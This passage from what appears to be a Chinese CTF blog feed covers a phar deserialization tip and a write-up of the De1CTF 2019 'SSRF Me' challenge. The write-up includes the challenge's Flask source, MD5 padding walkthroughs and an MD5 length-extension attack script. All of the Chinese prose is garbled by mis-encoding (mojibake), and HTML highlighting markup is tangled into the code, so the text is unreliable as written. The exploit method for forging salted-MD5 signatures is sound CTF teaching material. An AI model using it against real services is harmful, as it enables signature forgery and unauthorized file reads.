href="#TIP1ï¼šåœ¨delete-phpä¸­åˆ©ç”¨payloadï¼Œè€Œä¸æ˜¯download-php">ğŸ­</a>TIP1ï¼šåœ¨delete.phpä¸­åˆ©ç”¨payloadï¼Œè€Œä¸æ˜¯download.php</h4><p><img src="/2021/05/18/dropbox/6.jpg" alt="6"></p><p><code>open_basedir</code></p><p><code>in_set</code>å‡½æ•°æ˜¯ç”¨æ¥å®Œæˆphpçš„ä¸€äº›é…ç½®ï¼Œå…¶ä¸­å°±åŒ…æ‹¬open_basedir ï¼Œç”¨æ¥é™åˆ¶å½“å‰ç¨‹åºå¯ä»¥è®¿é—®çš„ç›®å½•ã€‚å®ƒæ˜¯å¯ä»¥è®¿é—®è®¾ç½®ç›®å½•ä¸‹çš„æ‰€æœ‰ä¸‹çº§ç›®å½•ã€‚<code>open_basedir = /dir/user</code>, é‚£ä¹ˆç›®å½• <code>/dir/user</code> å’Œ <code>/dir/other</code>éƒ½æ˜¯å¯ä»¥è®¿é—®çš„ã€‚æ‰€ä»¥å¦‚æœè¦å°†è®¿é—®é™åˆ¶åœ¨ä»…ä¸ºæŒ‡å®šçš„ç›®å½•ï¼Œéœ€è¦ç”¨æ–œçº¿ç»“æŸè·¯å¾„åã€‚â€.&quot;å¯ä»£è¡¨å½“å‰ç›®å½•ï¼Œ<code>open_basedir</code>ä¹Ÿå¯ä»¥åŒæ—¶è®¾ç½®å¤šä¸ªç›®å½•,åœ¨Windowsä¸­ç”¨åˆ†å·åˆ†éš”ç›®å½•,åœ¨ä»»ä½•å…¶å®ƒç³»ç»Ÿä¸­ç”¨å†’å·åˆ†éš”ç›®å½•ã€‚</p><p>æœ¬ä¾‹ï¼š<code>ini_set(â€œopen_basedirâ€, getcwd() . â€œ:/etc:/tmpâ€); </code>å°±æ˜¯åªå¯ä»¥è®¿é—®å½“å‰ç›®å½•(getcwd()è¿”å›å½“å‰ç›®å½•)ã€/etcå’Œ/tmpä¸‰ä¸ªç›®å½•ã€‚</p><h4 id="TIP2ï¼šphar"><a class="header-anchor" href="#TIP2ï¼šphar">ğŸ­</a>TIP2ï¼šphar</h4><p>è¯¦è§ï¼š<a href="https://xz.aliyun.com/t/2715">phar://</a></p><p>æŠŠä¸€ä¸ªåºåˆ—åŒ–çš„å¯¹è±¡ï¼Œå‚¨å­˜åœ¨pharæ ¼å¼çš„æ–‡ä»¶ä¸­ï¼Œ<strong>ç”Ÿæˆå</strong>å³ä½¿æˆ‘ä»¬æŠŠæ ¼å¼ç»™æ”¹äº†ï¼Œä¹Ÿä¸å½±å“å®ƒçš„ä½œç”¨ï¼šç”¨ä¸€äº›æ–‡ä»¶åŒ…å«å‡½æ•°ï¼Œè‹¥ä»¥<code>phar://</code>åè®®å»è®¿é—®è¿™ä¸ªæ–‡ä»¶ï¼Œé‚£ä¹ˆå°±å¯ä»¥æŠŠé‚£ä¸ªå¯¹è±¡ç»™ååºåˆ—åŒ–ã€‚<br>phpä¸€å¤§éƒ¨åˆ†çš„æ–‡ä»¶ç³»ç»Ÿå‡½æ•°åœ¨é€šè¿‡phar://ä¼ªåè®®è§£æpharæ–‡ä»¶æ—¶ï¼Œéƒ½ä¼šå°†meta-dataè¿›è¡Œååºåˆ—åŒ–ï¼Œå—å½±å“çš„å‡½æ•°å¦‚ä¸‹ï¼š<br><img src="/2021/05/18/dropbox/1.png" alt="1"></p><p>å‚è€ƒï¼š<a href="https://blog.csdn.net/qq_43756333/article/details/106503047">å®¡è®¡ç»ƒä¹ 10â€”â€”[CISCN2019 ååŒ—èµ›åŒº Day1 Web1]Dropbox</a></p><p><a href="https://blog.csdn.net/weixin_44077544/article/details/102844554">[CISCN2019 ååŒ—èµ›åŒº Day1 Web1]Dropbox</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hash Length Extension Attack</title>
    <link href="/2021/05/05/hash/"/>
    <url>/2021/05/05/hash/</url>
    
    <content type="html"><![CDATA[<p>æ–°çŸ¥è¯†ç‚¹MD5hashé•¿åº¦æ‰©å±•æ”»å‡»å€Ÿ[De1CTF 2019]SSRF Meè®°å½•ä¸€ä¸‹ã€‚</p><p>æºç ï¼š</p><pre><code class="hljs ruby"><span class="hljs-comment">#! /usr/bin/env python</span><span class="hljs-comment">#encoding=utf-8</span>from flask import Flaskfrom flask import requestimport socketimport hashlibimport urllibimport sysimport osimport jsonreload(sys)sys.setdefaultencoding(<span class="hljs-string">&#x27;latin1&#x27;</span>)app = Flask(__name_<span class="hljs-number">_</span>)secert_key = os.urandom(<span class="hljs-number">16</span>)<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Task</span>:</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(<span class="hljs-keyword">self</span>, action, param, sign, ip)</span></span><span class="hljs-symbol">:</span>        <span class="hljs-keyword">self</span>.action = action        <span class="hljs-keyword">self</span>.param = param        <span class="hljs-keyword">self</span>.sign = sign        <span class="hljs-keyword">self</span>.sandbox = md5(ip)        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">not</span> os.path.exists(<span class="hljs-keyword">self</span>.sandbox)):          <span class="hljs-comment">#SandBox For Remote_Addr</span>            os.mkdir(<span class="hljs-keyword">self</span>.sandbox)    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Exec</span><span class="hljs-params">(<span class="hljs-keyword">self</span>)</span></span><span class="hljs-symbol">:</span>        result = &#123;&#125;        result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">500</span>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">self</span>.checkSign())<span class="hljs-symbol">:</span>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;scan&quot;</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">self</span>.<span class="hljs-symbol">action:</span>                tmpfile = open(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % <span class="hljs-keyword">self</span>.sandbox, <span class="hljs-string">&#x27;w&#x27;</span>)                resp = scan(<span class="hljs-keyword">self</span>.param)                <span class="hljs-keyword">if</span> (resp == <span class="hljs-string">&quot;Connection Timeout&quot;</span>)<span class="hljs-symbol">:</span>                    result[<span class="hljs-string">&#x27;data&#x27;</span>] = resp                <span class="hljs-symbol">else:</span>                    print resp                    tmpfile.write(resp)                    tmpfile.close()                result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;read&quot;</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">self</span>.<span class="hljs-symbol">action:</span>                f = open(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % <span class="hljs-keyword">self</span>.sandbox, <span class="hljs-string">&#x27;r&#x27;</span>)                result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span>                result[<span class="hljs-string">&#x27;data&#x27;</span>] = f.read()            <span class="hljs-keyword">if</span> result[<span class="hljs-string">&#x27;code&#x27;</span>] == <span class="hljs-number">500</span><span class="hljs-symbol">:</span>                result[<span class="hljs-string">&#x27;data&#x27;</span>] = <span class="hljs-string">&quot;Action Error&quot;</span>        <span class="hljs-symbol">else:</span>            result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">500</span>            result[<span class="hljs-string">&#x27;msg&#x27;</span>] = <span class="hljs-string">&quot;Sign Error&quot;</span>        <span class="hljs-keyword">return</span> result    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">checkSign</span><span class="hljs-params">(<span class="hljs-keyword">self</span>)</span></span><span class="hljs-symbol">:</span>        <span class="hljs-keyword">if</span> (getSign(<span class="hljs-keyword">self</span>.action, <span class="hljs-keyword">self</span>.param) == <span class="hljs-keyword">self</span>.sign)<span class="hljs-symbol">:</span>            <span class="hljs-keyword">return</span> True        <span class="hljs-symbol">else:</span>            <span class="hljs-keyword">return</span> False<span class="hljs-comment">#generate Sign For Action Scan.</span>@app.route(<span class="hljs-string">&quot;/geneSign&quot;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>])<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">geneSign</span><span class="hljs-params">()</span></span><span class="hljs-symbol">:</span>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))    action = <span class="hljs-string">&quot;scan&quot;</span>    <span class="hljs-keyword">return</span> getSign(action, param)@app.route(<span class="hljs-string">&#x27;/De1ta&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>,<span class="hljs-string">&#x27;POST&#x27;</span>])<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">challenge</span><span class="hljs-params">()</span></span><span class="hljs-symbol">:</span>    action = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;action&quot;</span>))    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))    sign = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;sign&quot;</span>))    ip = request.remote_addr    <span class="hljs-keyword">if</span>(waf(param))<span class="hljs-symbol">:</span>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No Hacker!!!!&quot;</span>    task = Task(action, param, sign, ip)    <span class="hljs-keyword">return</span> json.dumps(task.Exec())@app.route(<span class="hljs-string">&#x27;/&#x27;</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span><span class="hljs-params">()</span></span><span class="hljs-symbol">:</span>    <span class="hljs-keyword">return</span> open(<span class="hljs-string">&quot;code.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>).read()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">scan</span><span class="hljs-params">(param)</span></span><span class="hljs-symbol">:</span>    socket.setdefaulttimeout(<span class="hljs-number">1</span>)    <span class="hljs-symbol">try:</span>        <span class="hljs-keyword">return</span> urllib.urlopen(param).read()[<span class="hljs-symbol">:</span><span class="hljs-number">50</span>]    <span class="hljs-symbol">except:</span>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Connection Timeout&quot;</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getSign</span><span class="hljs-params">(action, param)</span></span><span class="hljs-symbol">:</span>    <span class="hljs-keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">md5</span><span class="hljs-params">(content)</span></span><span class="hljs-symbol">:</span>    <span class="hljs-keyword">return</span> hashlib.md5(content).hexdigest()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">waf</span><span class="hljs-params">(param)</span></span><span class="hljs-symbol">:</span>    check=param.strip().lower()    <span class="hljs-keyword">if</span> check.startswith(<span class="hljs-string">&quot;gopher&quot;</span>) <span class="hljs-keyword">or</span> check.startswith(<span class="hljs-string">&quot;file&quot;</span>)<span class="hljs-symbol">:</span>        <span class="hljs-keyword">return</span> True    <span class="hljs-symbol">else:</span>        <span class="hljs-keyword">return</span> False<span class="hljs-keyword">if</span> __name_<span class="hljs-number">_</span> == <span class="hljs-string">&#x27;__main__&#x27;</span><span class="hljs-symbol">:</span>    app.debug = False    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>)</code></pre><h3 id="æ³•ä¸€"><a class="header-anchor" href="#æ³•ä¸€">ğŸ­</a>æ³•ä¸€</h3><p>flaskæ¡†æ¶ï¼Œä¸€å…±ä¸‰ä¸ªè·¯ç”±ï¼š</p><blockquote><p>indexè·å–æºç </p></blockquote><blockquote><p>geneSignè°ƒç”¨äº†getSignæ–¹æ³•ç”Ÿæˆ md5</p></blockquote><blockquote><p>De1taè·å–äº†ä¸‰ä¸ªå‚æ•°</p><blockquote><p><code>action = urllib.unquote(request.cookies.get(&quot;action&quot;))</code>//actionæ˜¯ä¼ å…¥readå’Œscançš„<br><code>param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))</code>//ä¼ å…¥ä¸€ä¸ªæ–‡ä»¶å<br><code>sign = urllib.unquote(request.cookies.get(&quot;sign&quot;))</code>//signæ˜¯MD5å€¼<br>Taskä¸­æœ‰ä¸ªExec()æ–¹æ³•ï¼Œé‡Œé¢è¿˜æœ‰ä¸ªcheckSign()ï¼Œå¹¶ä¸”åœ¨è¿™é‡Œé¢è°ƒç”¨äº†getSign()æ–¹æ³•ï¼Œç»“æœä¸signè¿›è¡Œæ¯”è¾ƒï¼ŒgetSign()æ–¹æ³•é‡Œæœ‰ä¸ªsecert_keyï¼Œæˆ‘ä»¬éœ€è¦æ„é€ å‚æ•°:ç¬¬ä¸€ä¸ªå‚æ•°actionåº”è¯¥åŒ…å«readï¼Œç¬¬äºŒä¸ªparamå‚æ•°åº”è¯¥æ˜¯æ–‡ä»¶åï¼Œç¬¬ä¸‰ä¸ªå‚æ•°çš„secert_keyå€¼æˆ‘ä»¬ä¸çŸ¥é“ï¼Œæ‰€ä»¥ä¸èƒ½è‡ªå·±åŠ å¯†ï¼Œè®¿é—®ä¸€ä¸‹geneSigné¡µé¢ï¼Œå¹¶ä¼ å…¥å‚æ•°param=flag.txtå¾—åˆ°ä¸€ä¸²MD5å€¼ï¼š</p><p><img src="/2021/05/05/hash/1.jpg" alt="1"></p><p>æºç <code>md5(secert_key + param + action)</code>é‡Œçš„actionå›ºå®šä¸ºcsanï¼Œæ‰€ä»¥æˆ‘ä»¬ç°åœ¨éœ€è¦çš„æ˜¯<code>md5(key+flag.txt+scanread/readscan)</code>æˆ‘ä»¬ç°åœ¨å¾—åˆ°äº†md5å€¼ï¼Œæ¥ç€è®¿é—®De1taé¡µé¢ä¼ å…¥flag.txtå³å¯</p><img src="/2021/05/05/hash/2.jpg" alt="2" style="zoom: 50%;"></blockquote></blockquote><h2 id="æ³•äºŒï¼šMD5hashé•¿åº¦æ‰©å±•æ”»å‡»"><a class="header-anchor" href="#æ³•äºŒï¼šMD5hashé•¿åº¦æ‰©å±•æ”»å‡»">ğŸ­</a>æ³•äºŒï¼šMD5hashé•¿åº¦æ‰©å±•æ”»å‡»</h2><h4 id="MD5ç®—æ³•"><a class="header-anchor" href="#MD5ç®—æ³•">ğŸ­</a>MD5ç®—æ³•</h4><p><img src="/2021/05/05/hash/4.png" alt="4"></p><p>MD5ç®—æ³•åˆ†ä¸ºä¸¤æ­¥ï¼š</p><ul><li>MD5 padding</li><li>MD5 compress</li></ul><h4 id="md5-padding"><a class="header-anchor" href="#md5-padding">ğŸ­</a>md5 padding</h4><blockquote><p>å¦‚æœè¾“å…¥ä¿¡æ¯çš„é•¿åº¦(å­—èŠ‚)å¯¹64æ±‚ä½™çš„ç»“æœä¸ç­‰äº56ï¼Œå°±éœ€è¦å¡«å……ä½¿å¾—å¯¹64æ±‚ä½™çš„ç»“æœç­‰äº56ã€‚å¡«å……çš„æ–¹æ³•æ˜¯å¡«å……ä¸€ä¸ªx80å’Œxxä¸ª0ã€‚å¡«å……å®Œåï¼Œä¿¡æ¯çš„é•¿åº¦ä¸ºN*64+56(å­—èŠ‚)ï¼Œå¹¶ä¸”æœ€å8ä¸ªå­—èŠ‚ç”¨æ¥è®°å½•åŸå§‹è¾“å…¥ä¿¡æ¯é•¿åº¦</p></blockquote><p>å¦‚adminè¿›è¡Œmd5 paddingçš„ç»“æœä¸ºï¼š</p><pre><code class="hljs angelscript"><span class="hljs-number">61646</span>d696e8000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002800000000000000</code></pre><p>å³ç”±ä»¥ä¸‹å‡ å—ç»„åˆ<br><code>61646d696e</code> ï¼šadminçš„hex<br><code>80</code>ï¼šå¡«å……çš„x80<br><code>50ä¸ª00</code>ï¼šä¸ºäº†ä¿è¯ä¿¡æ¯çš„é•¿åº¦ä¸ºN*64+56(å­—èŠ‚)<br><code>2800000000000000</code>ï¼šå®é™…çš„å€¼ä¸º<code>0000000000000028</code>ï¼Œåè¿›åˆ¶çš„40ï¼Œå•ä½æ˜¯bitï¼Œæ‰€ä»¥æ˜¯5ä¸ªå­—èŠ‚(admin)</p><h3 id="Magic-number"><a class="header-anchor" href="#Magic-number">ğŸ­</a>Magic number</h3><blockquote><p>ä»£ç ä¸­çš„<code>0x67452301L, 0xefcdab89L, 0x98badcfeL, 0x10325476L</code>è¿™4ä¸ªåˆå§‹åŒ–çš„numberå°±è¢«ç§°ä¸ºMagic numberæˆ–è€…æ˜¯md5 iv(md5 å‘é‡)</p></blockquote><p>md5çš„ç®—æ³•æ¦‚æ‹¬ï¼š</p><blockquote><p>å…ˆè¿›è¡Œæ¶ˆæ¯é•¿åº¦çš„å¡«å……(padding)ã€‚å¡«å……å®Œåï¼Œåˆå§‹åŒ–çš„4ä¸ªMagic numberä¼šå’Œç¬¬ä¸€ä¸ª64å­—èŠ‚çš„Message blockè¿›è¡Œmd5  compresså‹ç¼©ç®—æ³•ã€‚å‹ç¼©ç®—æ³•å®Œæˆåï¼Œä¼šäº§ç”Ÿæ–°çš„4ä¸ªMagic numberã€‚è¿™æ ·å†è¿›è¡Œç¬¬äºŒä¸ª64å­—èŠ‚Message blockçš„md5  compresså‹ç¼©ç®—æ³•ã€‚ä»¥æ­¤ç±»æ¨â€¦â€¦ç›´åˆ°å‹ç¼©åˆ°æœ€å64ä¸ªå­—èŠ‚çš„(<code>Message block</code> + padding)ï¼Œæœ€åå¾—åˆ°çš„Magic numberç»è¿‡hexè½¬åŒ–å°±æ˜¯æœ€åçš„md5 hashå€¼</p></blockquote><p>adminï¼š</p><p>md5ç»è¿‡paddingåï¼Œç”±äºåªæœ‰64å­—èŠ‚ï¼Œæ‰€ä»¥åªè¿›è¡Œä¸€è½®md5 compressã€‚å‹ç¼©ç®—æ³•å®Œæˆåï¼Œäº§ç”Ÿçš„æ–°çš„Magic numberä¸º</p><pre><code class="hljs apache"><span class="hljs-attribute">A</span>=<span class="hljs-number">0</span>x<span class="hljs-number">292</span>f<span class="hljs-number">2321</span>L<span class="hljs-attribute">B</span>=<span class="hljs-number">0</span>xa<span class="hljs-number">7</span>a<span class="hljs-number">5577</span>aL<span class="hljs-attribute">C</span>=<span class="hljs-number">0</span>xe<span class="hljs-number">4</span>a<span class="hljs-number">8943</span>L<span class="hljs-attribute">D</span>=<span class="hljs-number">0</span>xc<span class="hljs-number">31</span>f<span class="hljs-number">804</span>aL</code></pre><p>md5çš„åŠ å¯†ç»“æœæ˜¯<code>21232f297a57a5a743894a0e4a801fc3</code>ï¼Œæˆ‘ä»¬å°†Aå¤§å°ç«¯é€†åºä¸€ä¸‹ï¼Œå˜æˆ21232F29ï¼Œåˆšå¥½æ˜¯md5çš„å‰8ä½ã€‚</p><p>å·²çŸ¥ï¼š</p><ul><li>md5(salt+message)çš„å€¼</li><li>messageå†…å®¹</li><li>salt+messageé•¿åº¦</li></ul><p>MD5é•¿åº¦æ‰©å±•æ”»å‡»å°±æ˜¯åœ¨ä¸çŸ¥é“saltçš„å…·ä½“å†…å®¹çš„æƒ…å†µä¸‹ï¼Œè®¡ç®—å‡ºä»»æ„çš„md5(salt+message+padding+append)å€¼ã€‚å› ä¸ºåœ¨è¿›è¡Œ<code>md5(salt+message+padding+m')</code>çš„æ—¶å€™ï¼Œåœ¨å¯¹mâ€™è¿›è¡Œpaddingä¹‹å‰çš„Message blockï¼Œå’Œ<code>md5(salt+message)</code>äº§æˆçš„Message blockä¸€æ ·ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬å°±èƒ½åœ¨saltæœªçŸ¥çš„æƒ…å†µä¸‹ï¼Œåªéœ€æ ¹æ®<code>md5(salt+message)</code>çš„ç»“æœï¼Œé€†å‘å‡ºæœ€åä¸€æ¬¡çš„4ä¸ªMagic numberã€‚</p><p>é€†å‘ç®—æ³•ï¼š</p><pre><code class="hljs apache"><span class="hljs-attribute">def</span> compute_magic_number(self, md<span class="hljs-number">5</span>str):    <span class="hljs-attribute">self</span>.A = struct.unpack(<span class="hljs-string">&quot;I&quot;</span>, md<span class="hljs-number">5</span>str[<span class="hljs-number">0</span>:<span class="hljs-number">8</span>].decode(&#x27;hex&#x27;))[<span class="hljs-number">0</span>]    <span class="hljs-attribute">self</span>.B = struct.unpack(<span class="hljs-string">&quot;I&quot;</span>, md<span class="hljs-number">5</span>str[<span class="hljs-number">8</span>:<span class="hljs-number">16</span>].decode(&#x27;hex&#x27;))[<span class="hljs-number">0</span>]    <span class="hljs-attribute">self</span>.C = struct.unpack(<span class="hljs-string">&quot;I&quot;</span>, md<span class="hljs-number">5</span>str[<span class="hljs-number">16</span>:<span class="hljs-number">24</span>].decode(&#x27;hex&#x27;))[<span class="hljs-number">0</span>]    <span class="hljs-attribute">self</span>.D = struct.unpack(<span class="hljs-string">&quot;I&quot;</span>, md<span class="hljs-number">5</span>str[<span class="hljs-number">24</span>:<span class="hljs-number">32</span>].decode(&#x27;hex&#x27;))[<span class="hljs-number">0</span>]</code></pre><p>æ ¹æ®è¿™4ä¸ªMagci numberï¼Œå†å’Œæ‰©å±•çš„å­—ç¬¦ä¸²<code>m'</code>(æ­¤æ—¶çš„mâ€™è¦è¿›è¡Œpaddingï¼Œpaddingçš„é•¿åº¦æ˜¯<code>len(salt+message+padding+m')</code>)è¿›è¡Œmd5 compressï¼Œæœ€åçš„ç»“æœå³<code>md5(salt+message+padding+m')</code>ï¼Œmâ€™è¡¨ç¤ºè¦æ‰©å±•çš„å­—ç¬¦ä¸²ï¼Œpaddingè¡¨ç¤ºå¯¹salt+messageé•¿åº¦è¿›è¡Œpaddingåçš„ç»“æœã€‚</p><h4 id="å®ä¾‹ï¼š"><a class="header-anchor" href="#å®ä¾‹ï¼š">ğŸ­</a>å®ä¾‹ï¼š</h4><p>å·²çŸ¥saltçš„é•¿åº¦ä¸º4ï¼Œmessageä¸ºadminï¼Œmd5(salt+message)çš„å€¼ä¸ºc7813629f22b6a7d28a08041db3e80a9ï¼Œæƒ³æ‰©å±•çš„å­—ç¬¦ä¸²mâ€™ä¸º<code>joychou</code>ï¼Œè®¡ç®—<code>md5(salt+message+padding+m')</code>çš„å€¼ï¼Œpaddingè¡¨ç¤ºå¯¹salt+messageé•¿åº¦è¿›è¡Œpaddingåçš„ç»“æœ</p><p>c7813629f22b6a7d28a08041db3e80a9é€†å‘å‡ºmagic numberä¸ºï¼š</p><pre><code class="hljs apache"><span class="hljs-attribute">A</span>=<span class="hljs-number">0</span>x<span class="hljs-number">292</span>f<span class="hljs-number">2321</span>L<span class="hljs-attribute">B</span>=<span class="hljs-number">0</span>xa<span class="hljs-number">7</span>a<span class="hljs-number">5577</span>aL<span class="hljs-attribute">C</span>=<span class="hljs-number">0</span>xe<span class="hljs-number">4</span>a<span class="hljs-number">8943</span>L<span class="hljs-attribute">D</span>=<span class="hljs-number">0</span>xc<span class="hljs-number">31</span>f<span class="hljs-number">804</span>aL</code></pre><p>å…ˆå¯¹mâ€™è¿›è¡Œpaddingï¼Œpaddingç»“æœç”¨<code>padding(m')</code></p><pre><code class="hljs angelscript"><span class="hljs-number">800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003802000000000000</span></code></pre><p>é•¿åº¦57ä¸ªå­—èŠ‚ï¼Œæ³¨æ„æœ€å8ä¸ªå­—èŠ‚0x238ä¸º<code>len(salt+message+padding+m')</code>ï¼Œå³568bitï¼Œ71å­—èŠ‚</p><p>å†ç”¨è¿™4ä¸ªmagic  numberå¯¹mâ€™äº§ç”Ÿçš„Message blockè¿›è¡Œmd5 compressï¼Œæœ€åç»“æœä¸º06cf5a94dcda53659f58c0f411ba0bd8</p><p>ä¸ºäº†è¯æ˜å’ŒéªŒè¯æƒ³æ³•ï¼Œæˆ‘ä»¬æ­£å‘å»è¿›è¡Œmd5åŠ å¯†ï¼Œçœ‹çœ‹paddingçš„è¿‡ç¨‹ã€‚æ­¤æ—¶éœ€è¦çŸ¥é“saltï¼Œsaltä¸º<code>meme</code></p><p>åŸå§‹çš„urlencodeåå­—ç¬¦ä¸²ä¸º</p><pre><code class="hljs angelscript">memeadmin%<span class="hljs-number">80</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>H%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>%<span class="hljs-number">00</span>joychou</code></pre><p>ä»£ç ï¼š</p><pre><code class="hljs python">str = unquote(<span class="hljs-string">&quot;memeadmin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00H%00%00%00%00%00%00%00joychou&quot;</span>)m = md5py.md5()<span class="hljs-keyword">print</span> m.my_md5(str)</code></pre><p>è¿›è¡Œpaddingå</p><pre><code class="hljs angelscript"><span class="hljs-number">6</span>d656d6561646d696e800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000048000000000000006a6f7963686f75800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003802000000000000</code></pre><p>å¯ä»¥å‘ç°ï¼Œå…¶å®åªå¯¹joychouè¿›è¡Œäº†paddingã€‚è€Œä¸”å‰64å­—èŠ‚äº§ç”Ÿçš„magic numberæ­£æ˜¯c7813629f22b6a7d28a08041db3e80a9ç®—å‡ºæ¥çš„ã€‚</p><p><a href="https://github.com/JoyChou93/md5-extension-attack">md5é•¿åº¦æ‰©å±•æ”»å‡»ä»£ç è„šæœ¬</a>ï¼š</p><pre><code class="hljs apache"><span class="hljs-comment"># coding:utf-8</span><span class="hljs-attribute">import</span> md<span class="hljs-number">5</span>py<span class="hljs-attribute">import</span> sys<span class="hljs-attribute">from</span> urllib import unquote<span class="hljs-attribute">import</span> hashlib<span class="hljs-attribute">import</span> struct<span class="hljs-attribute">import</span> urllib<span class="hljs-attribute">def</span> payload(length, str_append):    <span class="hljs-attribute">pad</span> = &#x27;&#x27;    <span class="hljs-attribute">n0</span> = ((<span class="hljs-number">56</span> - (length + <span class="hljs-number">1</span>) % <span class="hljs-number">64</span>) % <span class="hljs-number">64</span>)    <span class="hljs-attribute">pad</span> += &#x27;\x<span class="hljs-number">80</span>&#x27;     <span class="hljs-attribute">pad</span> += &#x27;\x<span class="hljs-number">00</span>&#x27;*n<span class="hljs-number">0</span> + struct.pack(&#x27;Q&#x27;, length*<span class="hljs-number">8</span>)    <span class="hljs-attribute">return</span> pad + str_append<span class="hljs-attribute">def</span> hashmd<span class="hljs-number">5</span>(str):    <span class="hljs-attribute">return</span> hashlib.md<span class="hljs-number">5</span>(str).hexdigest()<span class="hljs-attribute">def</span> check_extension_attack():    <span class="hljs-attribute">for</span> i in range(<span class="hljs-number">1</span>, <span class="hljs-number">65</span>):        <span class="hljs-attribute">s</span> = <span class="hljs-string">&quot;A&quot;</span> * i        <span class="hljs-attribute">mm</span> = md<span class="hljs-number">5</span>py.md<span class="hljs-number">5</span>()        <span class="hljs-attribute">assert</span> hashlib.md<span class="hljs-number">5</span>(s).hexdigest() == mm.my_md<span class="hljs-number">5</span>(s)        <span class="hljs-attribute">print</span> mm.my_md<span class="hljs-number">5</span>(s)    <span class="hljs-attribute">for</span> i in range(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>):        <span class="hljs-attribute">for</span> j in range(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>):            <span class="hljs-attribute">s</span> = &#x27;A&#x27; * i            <span class="hljs-attribute">salt</span> = &#x27;B&#x27; * j            <span class="hljs-attribute">mm</span> = md<span class="hljs-number">5</span>py.md<span class="hljs-number">5</span>()            <span class="hljs-attribute">msg</span> = salt + s + payload(len(salt+s), &#x27;joychou&#x27;)            <span class="hljs-attribute">assert</span> hashmd<span class="hljs-number">5</span>(msg) == mm.extension_attack(hashmd<span class="hljs-number">5</span>(salt+s), &#x27;joychou&#x27;, len(salt+s))<span class="hljs-comment"># check if md5 extension attack is correct</span><span class="hljs-comment"># check_extension_attack()</span><span class="hljs-attribute">if</span> len(sys.argv) &lt; <span class="hljs-number">3</span>:    <span class="hljs-attribute">print</span> <span class="hljs-string">&quot;Usage: &quot;</span>, sys.argv[<span class="hljs-number">0</span>], <span class="hljs-string">&quot; &lt;md5string&gt; &lt;string_to_append&gt; [length of plaintext of md5string]&quot;</span>    